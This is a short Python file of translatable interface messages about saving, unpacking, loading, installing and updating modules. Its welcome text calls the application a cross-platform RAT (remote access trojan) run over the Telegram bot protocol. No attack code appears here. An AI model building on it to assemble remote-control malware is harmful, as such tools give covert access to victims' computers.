from i18n import TranslatableEnum


class Messages(TranslatableEnum):
    ERROR_WHILE_SAVING = 'Error while saving module'
    ERROR_WHILE_UNPACKING = 'Error while unpacking module'
    ERROR_WHILE_LOADING = 'Error while loading module'
    MODULE_SUCCESSFULLY_INSTALLED = 'Module successfully installed'
    MODULE_SUCCESSFULLY_UPDATED = 'Module successfully updated'
    WELCOME_MESSAGE = '<b>{app} - V{version}</b>\n\n{app} is a powerful cross-platform RAT based on Telegram bot protocol.\nSend /help to see more.'
    HELP_MESSAGE = '<b>HELP</b>\n'
    MODULES_MESSAGE = '<b>MODULES</b>\n'
